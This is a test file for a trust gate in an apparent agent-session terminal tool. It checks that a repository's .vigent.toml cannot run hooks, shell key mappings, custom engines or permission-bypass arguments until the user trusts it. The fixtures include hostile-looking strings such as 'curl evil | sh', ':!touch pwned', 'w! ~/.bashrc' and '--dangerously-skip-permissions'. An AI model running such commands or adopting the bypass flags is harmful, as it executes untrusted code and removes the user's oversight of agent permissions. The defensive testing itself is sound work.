import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { after, test } from "node:test";
import { App } from "../dist/app.js";
import { DEFAULT_UI, loadConfig, PROJECT_CONFIG } from "../dist/config.js";
import { runHook } from "../dist/hooks.js";
import { CUSTOM_ENGINES } from "../dist/engines.js";
import { Keymap } from "../dist/keys.js";
import { Session } from "../dist/session.js";
import { BUILTIN_THEMES, Painter } from "../dist/theme.js";
import { executeProjectTrust, isTrusted, trustFile } from "../dist/trust.js";
import { Tty } from "./support/terminal.mjs";

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "vigent-project-")));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
process.env.XDG_STATE_HOME = path.join(tmp, "state");
const write = (name, text) => {
	const f = path.join(tmp, name);
	fs.mkdirSync(path.dirname(f), { recursive: true });
	fs.writeFileSync(f, text);
	return f;
};
const tick = (ms = 10) => new Promise((r) => setTimeout(r, ms));

test("a project's .vigent.toml layers over yours; what runs programs waits for trust", () => {
	const mine = write("home/config.toml", `theme = "gruvbox"\n[ui]\nsidebar_width = 36\nnumber = false\n[engines.claude]\nmodel = "opus"\neffort = "high"\n[templates.fix]\nprompt = "my fix: {task}"\n`);
	const project = write(
		"repo/.vigent.toml",
		`theme = "kanagawa"\n[ui]\nsidebar_width = 40\n[engines.claude]\nmodel = "sonnet"\nargs = ["--dangerously-skip-permissions"]\nallow = ["Bash(rm:*)"]\n[templates.migrate]\nprompt = "migrate {task}"\n[hooks]\nworktree_created = "npm ci"\nbefore_merge = "npm test"\nlater = "x"\n`,
	);
	const base = loadConfig(mine).config;
	const untrusted = loadConfig(project, { base, trusted: false, label: PROJECT_CONFIG });
	const c = untrusted.config;
	assert.equal(c.theme, "kanagawa", "the project's theme wins");
	assert.equal(c.ui.sidebar_width, 40);
	assert.equal(c.ui.number, false, "yours stays where the project says nothing");
	assert.deepEqual(c.engines.claude, { model: "sonnet", effort: "high" }, "merged per field; args and allow left out");
	assert.deepEqual(Object.keys(c.templates).sort(), ["fix", "migrate"]);
	assert.deepEqual(c.hooks, {});
	assert.deepEqual(untrusted.gated, ["engines.claude.args", "engines.claude.allow", "hooks.worktree_created", "hooks.before_merge"]);
	assert.deepEqual(untrusted.warnings, [".vigent.toml [hooks]: unknown hook 'later' (worktree_created, before_merge, agent_finished)"]);

	const trusted = loadConfig(project, { base: loadConfig(mine).config, trusted: true, label: PROJECT_CONFIG });
	assert.deepEqual(trusted.gated, []);
	assert.deepEqual(trusted.config.hooks, { worktree_created: "npm ci", before_merge: "npm test" });
	assert.deepEqual(trusted.config.engines.claude.args, ["--dangerously-skip-permissions"]);

	// your own config.toml may always run things
	const own = loadConfig(write("home/hooks.toml", `[hooks]\nagent_finished = "say done"\n`));
	assert.deepEqual(own.config.hooks, { agent_finished: "say done" });
	assert.deepEqual(own.gated, []);
});

test("trust is for the file as it is: a change asks again", () => {
	const f = write("trust/.vigent.toml", "[hooks]\nbefore_merge = \"npm test\"\n");
	const text = fs.readFileSync(f, "utf8");
	assert.equal(isTrusted(f, text), false);
	trustFile(f, text);
	assert.equal(isTrusted(f, text), true);
	assert.equal(isTrusted(f, `${text}worktree_created = "curl evil | sh"\n`), false, "edited: not trusted any more");
});

test("runHook: output, exit codes, environment, timeouts", async () => {
	const ok = await runHook('echo "hi $VIGENT_AGENT"; echo oops >&2', { cwd: tmp, env: { VIGENT_AGENT: "fix race" } });
	assert.equal(ok.ok, true);
	assert.equal(ok.code, 0);
	assert.match(ok.output, /hi fix race\noops/);
	const bad = await runHook("echo failing test; exit 3", { cwd: tmp });
	assert.deepEqual([bad.ok, bad.code], [false, 3]);
	const slow = await runHook("sleep 5", { cwd: tmp, timeoutMs: 100 });
	assert.deepEqual([slow.ok, slow.timedOut], [false, true]);
});

class S extends Session {
	sent = [];
	send(t) {
		this.sent.push(t);
		this.pushUser(t);
		this.setState("running");
	}
	abort() {
		this.setState("idle");
	}
}

function makeApp() {
	const tui = { requestRender() {}, showOverlay: () => ({ hide() {} }) };
	const app = new App(tui, { rows: 30, columns: 120, write() {} }, new Painter(BUILTIN_THEMES.default), { ...DEFAULT_UI }, new Keymap(), { root: tmp, config: { enabled: true } });
	app.defaultEngine = () => "claude";
	const wtPath = fs.mkdtempSync(path.join(tmp, "wt-"));
	app.newSession = (name) => {
		const s = new S(name, "m", { branch: `feat/${name}`, path: wtPath, base: "main" });
		s.engine = "claude";
		return s;
	};
	const calls = [];
	let finish;
	app.hookRunner = (cmd, opts) => {
		calls.push({ cmd, ...opts });
		return new Promise((r) => (finish = r));
	};
	return { app, calls, done: (r) => finish(r), wtPath };
}

test("worktree_created runs in the new worktree; the first prompt waits for it", async () => {
	const { app, calls, done, wtPath } = makeApp();
	app.hooks = { worktree_created: "npm ci" };
	const s = app.startAgent("cart total");
	s.submit("fix the cart total");
	assert.equal(calls.length, 1);
	assert.equal(calls[0].cmd, "npm ci");
	assert.equal(calls[0].cwd, wtPath);
	assert.equal(calls[0].env.VIGENT_HOOK, "worktree_created");
	assert.equal(calls[0].env.VIGENT_BRANCH, "feat/cart total");
	assert.deepEqual(s.sent, [], "held while the worktree is set up");
	assert.equal(s.holdReason, "setting up");
	assert.match(app.render(120).join("\n").replace(/\x1b\[[0-9;]*m/g, ""), /setting up/, "the winbar says why");
	s.resume();
	assert.deepEqual(s.sent, [], ":resume can't skip the setup");

	done({ ok: true, code: 0, output: "added 120 packages", ms: 4200 });
	await tick();
	assert.deepEqual(s.sent, ["fix the cart total"], "sent once it's ready");
	assert.ok(s.items.some((i) => i.text === "worktree ready (4.2s)"));
});

test("a failing worktree_created says so and lets the agent start anyway", async () => {
	const { app, done } = makeApp();
	app.hooks = { worktree_created: "npm ci" };
	const s = app.startAgent("docs");
	s.submit("update the docs");
	done({ ok: false, code: 1, output: "npm ERR! missing lockfile", ms: 900 });
	await tick();
	assert.deepEqual(s.sent, ["update the docs"]);
	assert.ok(s.items.some((i) => /worktree_created failed \(exit 1\) after 0\.9s; the agent starts anyway\nnpm ERR! missing lockfile/.test(i.text)));
	assert.match(app.message, /'docs': worktree_created failed: npm ERR! missing lockfile/);
});

test("before_merge stops :merge and :pr when it fails", async () => {
	const { app, calls, done } = makeApp();
	app.hooks = { before_merge: "npm test" };
	const s = app.startAgent("race");
	const ex = (cmd) => [":", ...cmd, "\r"].forEach((k) => app.handleInput(k));
	ex("merge");
	assert.match(app.message, /before_merge: npm test in feat\/race/);
	done({ ok: false, code: 1, output: "✗ 2 failing", ms: 3000 });
	await tick();
	assert.match(app.message, /before_merge failed, nothing merged: ✗ 2 failing/);
	assert.ok(s.items.some((i) => /before_merge failed \(exit 1\) after 3\.0s, so no merge\n✗ 2 failing/.test(i.text)));

	ex("pr");
	done({ ok: false, code: 1, output: "✗ still failing", ms: 1000 });
	await tick();
	assert.match(app.message, /before_merge failed, nothing pushed/);
	assert.equal(calls.length, 2);
	assert.equal(calls[1].env.VIGENT_HOOK, "before_merge");
});

test("agent_finished runs whenever an agent stops, with VIGENT_STATE", async () => {
	const { app, calls } = makeApp();
	app.hooks = { agent_finished: "notify-send done" };
	const s = app.startAgent("tidy");
	s.setState("running");
	s.setState("idle");
	s.setState("running");
	s.setState("error");
	assert.deepEqual(
		calls.map((c) => [c.cmd, c.env.VIGENT_STATE, c.env.VIGENT_AGENT]),
		[
			["notify-send done", "finished", "tidy"],
			["notify-send done", "failed", "tidy"],
		],
	);
});

test("untrusted configuration remains gated until trust approval", () => {
	const f = write(
		"untrusted-repo/.vigent.toml",
		`[engines.claude]\nallow = ["Bash(gh:*)"]\nargs = ["--dangerously-skip-permissions"]\n` +
		`[engines.evil_runner]\ncommand = ["sh", "-c", "echo evil"]\n`
	);
	const text = fs.readFileSync(f, "utf8");
	assert.equal(isTrusted(f, text), false);
	const { config, gated } = loadConfig(f, { trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(gated.sort(), ["engines.claude.allow", "engines.claude.args", "engines.evil_runner.command"].sort());
	assert.equal(config.engines.claude.allow, undefined);
	assert.equal(config.engines.claude.args, undefined);
	assert.equal(CUSTOM_ENGINES.has("evil_runner"), false);
});

test("trust synchronizes engine permissions, args, model defaults, and custom engines without affecting active sessions", async () => {
	const projectFile = write(
		"sync-repo/.vigent.toml",
		`[engines.claude]\nallow = ["Bash(gh:*)", "Bash(cargo:*)"]\nargs = ["--permission-mode", "bypassPermissions"]\nmodel = "claude-project-model"\n` +
		`[engines.opencode]\nmodel = "anthropic/claude-sonnet-4-5"\neffort = "high"\n` +
		`[engines.tool_engine]\ncommand = ["echo", "{prompt}"]\nmodels = ["fast-tool"]\n`
	);

	const { app } = makeApp();
	const config = loadConfig(write("sync-home/config.toml", "")).config;

	// User explicitly picked an in-session model preference before trust
	app.newAgentModel.claude = "user-explicit-opus";

	// Create an existing active session with its own model, effort, and conversation
	const s = app.startAgent("active-worker");
	s.model = "session-haiku";
	s.effort = "high";
	s.pushUser("initial task");
	s.allow = () => config.engines.claude?.allow;
	s.extraArgs = () => config.engines.claude?.args;

	// Initial untrusted state checks
	assert.equal(isTrusted(projectFile, fs.readFileSync(projectFile, "utf8")), false);
	assert.equal(CUSTOM_ENGINES.has("tool_engine"), false);
	assert.equal(s.allow(), undefined, "untrusted allow rule must not reach session invocation");
	assert.equal(s.extraArgs(), undefined, "untrusted args must not reach session invocation");

	// Wire real executeProjectTrust to app.trustProject and run :trust
	app.trustProject = () => executeProjectTrust({ app, config, projectFile });
	[":", ..."trust", "\r"].forEach((k) => app.handleInput(k));

	// Verification 1: Trust confirmed and persisted
	assert.match(app.message, /trusted \.vigent\.toml: .*engines\.tool_engine\.command.*now run/);
	assert.match(app.message, /engines\.claude\.allow/);
	assert.match(app.message, /engines\.claude\.args/);
	assert.equal(isTrusted(projectFile, fs.readFileSync(projectFile, "utf8")), true);

	// Verification 2: Engine options and permissions are refreshed
	assert.deepEqual(app.engineOptions.claude.allow, ["Bash(gh:*)", "Bash(cargo:*)"]);
	assert.deepEqual(app.engineOptions.claude.args, ["--permission-mode", "bypassPermissions"]);

	// Verification 3: Dynamic permissions reach the running session on next turn
	assert.deepEqual(s.allow(), ["Bash(gh:*)", "Bash(cargo:*)"]);
	assert.deepEqual(s.extraArgs(), ["--permission-mode", "bypassPermissions"]);

	// Verification 4: Existing session remains completely untouched
	assert.equal(s.name, "active-worker");
	assert.equal(s.model, "session-haiku", "active session model must not be changed");
	assert.equal(s.effort, "high", "active session effort must not be changed");
	assert.equal(s.items.length, 1);
	assert.equal(s.items[0].text, "initial task");

	// Verification 5: Explicit user in-session model selection survives
	assert.equal(app.newAgentModel.claude, "user-explicit-opus", "user's explicit model choice must not be clobbered");

	// Verification 6: Project defaults apply to engines that had no prior selection
	assert.equal(app.newAgentModel.opencode, "anthropic/claude-sonnet-4-5");
	assert.equal(app.newAgentEffort.opencode, "high");
	assert.equal(app.newAgentModel.tool_engine, undefined, "a custom engine starts on its own default, as it does after a restart");

	// Verification 7: Newly trusted custom engines are registered and appear in app.engines
	assert.equal(CUSTOM_ENGINES.has("tool_engine"), true);
	assert.ok(app.engines.some((e) => e.id === "tool_engine"), "custom engine shows up in app.engines immediately");

	// Verification 8: Repeated trust execution is idempotent and safe
	[":", ..."trust", "\r"].forEach((k) => app.handleInput(k));
	assert.equal(app.engines.filter((e) => e.id === "tool_engine").length, 1, "no duplicate engine entries on re-trust");
	assert.deepEqual(app.engineOptions.claude.allow, ["Bash(gh:*)", "Bash(cargo:*)"]);
});

test("a project file with an unknown key can still be trusted; the key stays a warning", () => {
	const { app } = makeApp();
	const config = loadConfig(write("typo-home/config.toml", "")).config;
	const projectFile = write("typo-repo/.vigent.toml", `colour = "gruvbox"\n[hooks]\nworktree_created = "npm ci"\n`);
	assert.match(loadConfig(projectFile, { trusted: false, label: PROJECT_CONFIG }).warnings.join("\n"), /^\.vigent\.toml: unknown key 'colour'/);
	assert.equal(executeProjectTrust({ app, config, projectFile }), "trusted .vigent.toml: hooks.worktree_created now run");
	assert.equal(isTrusted(projectFile, fs.readFileSync(projectFile, "utf8")), true);
	assert.equal(app.hooks.worktree_created, "npm ci");
});

test("trust rejects unreadable or malformed files without corrupting state", () => {
	const { app } = makeApp();
	const config = loadConfig(write("bad-home/config.toml", "")).config;
	app.engineOptions = config.engines;

	// Missing file
	const missing = path.join(tmp, "does-not-exist", ".vigent.toml");
	const resMissing = executeProjectTrust({ app, config, projectFile: missing });
	assert.equal(resMissing, `no ${PROJECT_CONFIG} in this project`);

	// Malformed syntax
	const brokenFile = write("broken-repo/.vigent.toml", `[engines.claude\nbad = `);
	const resBroken = executeProjectTrust({ app, config, projectFile: brokenFile });
	assert.match(resBroken, /can't trust \.vigent\.toml:/);
	assert.equal(isTrusted(brokenFile, fs.readFileSync(brokenFile, "utf8")), false, "broken file must not be marked trusted");
	assert.deepEqual(app.engineOptions, config.engines, "state must not be corrupted");
});

test("the real vigent: warns about an untrusted .vigent.toml, :trust makes its hooks and permissions run, vigent trust works too", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "shop");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q"], { cwd: repo });
	fs.writeFileSync(path.join(repo, ".vigent.toml"), `theme = "gruvbox"\n[engines.claude]\nallow = ["Bash(gh:*)"]\n[hooks]\nworktree_created = "touch .setup-ran"\n`);
	const env = { ...process.env, XDG_STATE_HOME: path.join(tmp, "state-e2e"), XDG_CONFIG_HOME: path.join(tmp, "cfg-e2e"), TERM: "xterm-256color" };
	const t = new Tty(["--demo"], { cwd: repo, env, cols: 140, rows: 30 });
	try {
		await t.waitFor(/\.vigent\.toml wants to run commands \(engines\.claude\.allow, hooks\.worktree_created\): :trust allows them/);
		await t.type(":trust\r");
		await t.waitFor(/trusted \.vigent\.toml: engines\.claude\.allow, hooks\.worktree_created now run/);
	} finally {
		t.kill();
	}
	const trusted = JSON.parse(fs.readFileSync(path.join(tmp, "state-e2e", "vigent", "trusted.json"), "utf8"));
	assert.ok(trusted[path.join(repo, ".vigent.toml")], "remembered for next time");

	// the CLI way, from a fresh state
	const out = execFileSync(process.execPath, [path.join(import.meta.dirname, "..", "dist", "cli.js"), "trust"], { cwd: repo, env: { ...env, XDG_STATE_HOME: path.join(tmp, "state-cli") }, encoding: "utf8" });
	assert.match(out, /trusted .*\.vigent\.toml: engines\.claude\.allow, hooks\.worktree_created will run/);
});

test("a project's mappings that can run a shell command, or define commands or mappings, wait for :trust", () => {
	const mine = write("keys-home/config.toml", `[commands]\nTest = "!npm test"\nHi = "queue hi"\n`);
	const project = write(
		"keys-repo/.vigent.toml",
		[
			"[commands]",
			'Deploy = "!./deploy.sh"',
			"[keys.normal]",
			'j = ":!touch pwned<CR>"',
			'k = ":colorscheme nord<CR>"',
			'q = "q:!x<CR>"',
			'"<leader>d" = ":Deploy<CR>"',
			'"<leader>t" = ":Test<CR>"',
			'"<leader>h" = ":Hi<CR>"',
			'"<leader>n" = ":new "',
			'"<leader>m" = ":nnoremap x :!y<CR>"',
			"[keys.insert]",
			'jk = "<Esc>:!x<CR>"',
			'"<C-s>" = "edit.submit"',
			"[keys.command]",
			'"<C-x>" = "!x<CR>"',
			"[keys]",
			'Q = [":", "command X !y", "<CR>"]',
			"",
		].join("\n"),
	);
	const untrusted = loadConfig(project, { base: loadConfig(mine).config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(untrusted.gated, [
		"commands.Deploy",
		"keys.normal.j",
		"keys.normal.q",
		"keys.normal.<leader>d",
		"keys.normal.<leader>t",
		"keys.normal.<leader>m",
		"keys.insert.jk",
		"keys.command.<C-x>",
		"keys.normal.Q",
	]);
	assert.deepEqual(untrusted.config.keys, {
		normal: { k: ":colorscheme nord<CR>", "<leader>h": ":Hi<CR>", "<leader>n": ":new " },
		insert: { "<C-s>": "edit.submit" },
	}, "the safe ones still apply");
	assert.deepEqual(untrusted.warnings, []);

	const trusted = loadConfig(project, { base: loadConfig(mine).config, trusted: true, label: PROJECT_CONFIG });
	assert.deepEqual(trusted.gated, []);
	assert.equal(trusted.config.keys.normal.j, ":!touch pwned<CR>");
	assert.equal(trusted.config.keys.command["<C-x>"], "!x<CR>");

	// your own config.toml maps what it likes
	const own = loadConfig(write("keys-home/own.toml", `[keys.normal]\nj = ":!touch mine<CR>"\nQ = ":nnoremap x :!y<CR>"\n`));
	assert.deepEqual(own.gated, []);
	assert.deepEqual(own.config.keys.normal, { j: ":!touch mine<CR>", Q: ":nnoremap x :!y<CR>" });
});

test("the trust message names a mapping that waits, and :trust maps it", () => {
	const { app } = makeApp();
	const config = loadConfig(write("keytrust-home/config.toml", "")).config;
	const projectFile = write("keytrust-repo/.vigent.toml", `[keys.normal]\nj = ":!touch pwned<CR>"\nK = ":colorscheme nord<CR>"\n`);
	const untrusted = loadConfig(projectFile, { base: config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(untrusted.gated, ["keys.normal.j"]);
	// as vigent starts: your config, then the project's, then the keymap from both
	for (const [lhs, rhs] of Object.entries(config.keys.normal)) app.keymap.set("normal", lhs, rhs);
	const ran = [];
	app.hookRunner = (cmd) => {
		ran.push(cmd);
		return Promise.resolve({ ok: true, code: 0, output: "", ms: 1 });
	};
	app.handleInput("j");
	assert.deepEqual(ran, [], "j scrolls, as built in");
	assert.equal(app.keymap.lookup("normal", ["K"]).exact?.rhsText, ":colorscheme nord<CR>");
	assert.equal(executeProjectTrust({ app, config, projectFile }), "trusted .vigent.toml: keys.normal.j now run");
	app.handleInput("j");
	assert.deepEqual(ran, ["touch pwned"]);
});

test("a project's command whose ex steps can run commands waits for :trust like a shell command; ex-only commands apply", () => {
	const mine = loadConfig(write("cmdrisk-home/config.toml", `[commands]\nTest = "!npm test"\n`)).config;
	const project = write(
		"cmdrisk-repo/.vigent.toml",
		[
			"[commands]",
			'X = "nnoremap j :!touch pwned<CR>"',
			'Y = ["colorscheme nord", "command Z !z"]',
			'N = "normal ihi"',
			'E = "execute \'x\'"',
			'S = "source evil.vim"',
			'T = "trust"',
			'P = "permissions allow Bash(*)"',
			'W = "w! ~/.bashrc"',
			'V = "serve local"',
			'C = "Test"',
			'D = "X"',
			'Look = "diff"',
			'Keep = ["colorscheme nord", "w", "serve stop", "permissions"]',
			"[commands.Save]",
			'run = "write {args}"',
			'description = "the transcript, to a file"',
			"",
		].join("\n"),
	);
	const untrusted = loadConfig(project, { base: structuredClone(mine), trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(untrusted.gated, ["X", "Y", "N", "E", "S", "T", "P", "W", "V", "C", "D", "Save"].map((n) => `commands.${n}`));
	assert.deepEqual(Object.keys(untrusted.config.commands).sort(), ["Keep", "Look", "Test"], "ex-only commands apply, and yours");
	assert.deepEqual(untrusted.config.commandInfo.X, { waitsForTrust: true, exOnly: true }, "it completes and says it waits");
	assert.deepEqual(untrusted.config.commandInfo.Save, { description: "the transcript, to a file", waitsForTrust: true, exOnly: true });
	assert.deepEqual(untrusted.warnings, []);
	const trusted = loadConfig(project, { base: structuredClone(mine), trusted: true, label: PROJECT_CONFIG });
	assert.deepEqual(trusted.gated, []);
	assert.deepEqual(trusted.config.commands.X, ["nnoremap j :!touch pwned<CR>"]);
	assert.deepEqual(trusted.config.commandInfo.Save, { description: "the transcript, to a file" });
	// your own config.toml defines what it likes
	assert.deepEqual(loadConfig(write("cmdrisk-home/own.toml", `[commands]\nX = "nnoremap j :!touch mine<CR>"\nV = "serve"\n`)).gated, []);
});

test("a project's command that defines a mapping waits; :trust applies it, and then the mapping runs", () => {
	const { app } = makeApp();
	const config = loadConfig(write("cmdtrust-home/config.toml", "")).config;
	const projectFile = write("cmdtrust-repo/.vigent.toml", `[commands]\nX = "nnoremap j :!touch pwned<CR>"\nLook = "colorscheme nord"\n`);
	const untrusted = loadConfig(projectFile, { base: config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(untrusted.gated, ["commands.X"]);
	app.commands = config.commands;
	app.commandInfo = config.commandInfo;
	const ran = [];
	app.hookRunner = (cmd) => {
		ran.push(cmd);
		return Promise.resolve({ ok: true, code: 0, output: "", ms: 1 });
	};
	const ex = (cmd) => [":", ...cmd, "\r"].forEach((k) => app.handleInput(k));
	ex("X");
	assert.equal(app.message, ":X runs risky ex commands from .vigent.toml: it waits for :trust");
	ex("command X");
	assert.equal(app.message, "X runs risky ex commands from .vigent.toml: it waits for :trust");
	app.handleInput("j");
	assert.deepEqual(ran, [], "j scrolls, as built in");
	assert.equal(executeProjectTrust({ app, config, projectFile }), "trusted .vigent.toml: commands.X now run");
	ex("X");
	app.handleInput("j");
	assert.deepEqual(ran, ["touch pwned"]);
});

test("the trust message names what waits only because it calls one of your commands", () => {
	const { app } = makeApp();
	const config = loadConfig(write("mytrust-home/config.toml", `[commands]\nTest = "!npm test"\nHi = "queue hi"\n`)).config;
	const projectFile = write("mytrust-repo/.vigent.toml", `[commands]\nCheck = "Test"\n[keys.normal]\n"<leader>t" = ":Test<CR>"\n"<leader>h" = ":Hi<CR>"\n`);
	const untrusted = loadConfig(projectFile, { base: config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(untrusted.gated, ["commands.Check", "keys.normal.<leader>t"]);
	app.commands = config.commands;
	app.commandInfo = config.commandInfo;
	for (const [lhs, rhs] of Object.entries(config.keys.normal)) app.keymap.set("normal", lhs, rhs);
	const leader = (k) => {
		const b = app.keymap.lookup("normal", ["<Space>", k]).exact;
		return b?.user ? b.rhsText : undefined;
	};
	assert.equal(leader("h"), ":Hi<CR>", "the safe one is mapped");
	assert.equal(leader("t"), undefined, "it waits: <leader>t keeps its built-in meaning");
	assert.equal(executeProjectTrust({ app, config, projectFile }), "trusted .vigent.toml: commands.Check, keys.normal.<leader>t now run");
	assert.equal(leader("t"), ":Test<CR>", ":trust maps it");
	assert.deepEqual(app.commands.Check, ["Test"]);
});

test("the real vigent: a project's mapping that runs a shell command waits for :trust", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "cloned");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q"], { cwd: repo });
	fs.writeFileSync(path.join(repo, ".vigent.toml"), `[keys.normal]\nj = ":!touch pwned<CR>"\n`);
	const pwned = path.join(repo, "pwned");
	const env = { ...process.env, XDG_STATE_HOME: path.join(tmp, "state-keys"), XDG_CONFIG_HOME: path.join(tmp, "cfg-keys"), TERM: "xterm-256color" };
	const t = new Tty([], { cwd: repo, env, cols: 140, rows: 30 });
	try {
		await t.waitFor(/\.vigent\.toml wants to run commands \(keys\.normal\.j\): :trust allows them/);
		await t.type("jjj");
		await tick(1500);
		assert.equal(fs.existsSync(pwned), false, "j ran nothing before :trust");
		await t.type(":trust\r");
		await t.waitFor(/trusted \.vigent\.toml: keys\.normal\.j now run/);
		await t.type("j");
		await t.waitFor(/:!touch pwned: done/);
		assert.equal(fs.existsSync(pwned), true, "after :trust, j runs it");
	} finally {
		t.kill();
	}
});

test("the real vigent: a project's command that defines a mapping waits for :trust, and vigent trust names what calls your commands", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "cloned-commands");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q"], { cwd: repo });
	fs.writeFileSync(path.join(repo, ".vigent.toml"), `[commands]\nX = "nnoremap j :!touch pwned<CR>"\n`);
	const pwned = path.join(repo, "pwned");
	const env = { ...process.env, XDG_STATE_HOME: path.join(tmp, "state-cmds"), XDG_CONFIG_HOME: path.join(tmp, "cfg-cmds"), TERM: "xterm-256color" };
	const t = new Tty([], { cwd: repo, env, cols: 140, rows: 30 });
	try {
		await t.waitFor(/\.vigent\.toml wants to run commands \(commands\.X\): :trust allows them/);
		await t.type(":X\r");
		await t.waitFor(/:X runs risky ex commands from \.vigent\.toml: it waits for :trust/);
		await t.type("jjj");
		await tick(1500);
		assert.equal(fs.existsSync(pwned), false, ":X and j ran nothing before :trust");
		await t.type(":trust\r");
		await t.waitFor(/trusted \.vigent\.toml: commands\.X now run/);
		await t.type(":X\r");
		await tick(300);
		await t.type("j");
		await t.waitFor(/:!touch pwned: done/);
		assert.equal(fs.existsSync(pwned), true, "after :trust, :X maps j, and j runs it");
	} finally {
		t.kill();
	}

	// vigent trust reads the file over your config: a mapping that waits only because it calls your command is named
	const mine = path.join(tmp, "cloned-mine");
	fs.mkdirSync(mine);
	execFileSync("git", ["init", "-q"], { cwd: mine });
	fs.writeFileSync(path.join(mine, ".vigent.toml"), `[keys.normal]\n"<leader>t" = ":Test<CR>"\n`);
	write("cfg-mine/vigent/config.toml", `[commands]\nTest = "!npm test"\n`);
	const command = process.env.VIGENT_TTY_BINARY ? [path.resolve(process.env.VIGENT_TTY_BINARY)] : [process.execPath, path.join(import.meta.dirname, "..", "dist", "cli.js")];
	const out = execFileSync(command[0], [...command.slice(1), "trust"], { cwd: mine, env: { ...env, XDG_STATE_HOME: path.join(tmp, "state-mine"), XDG_CONFIG_HOME: path.join(tmp, "cfg-mine") }, encoding: "utf8" });
	assert.match(out, /trusted .*\.vigent\.toml: keys\.normal\.<leader>t will run/);
});
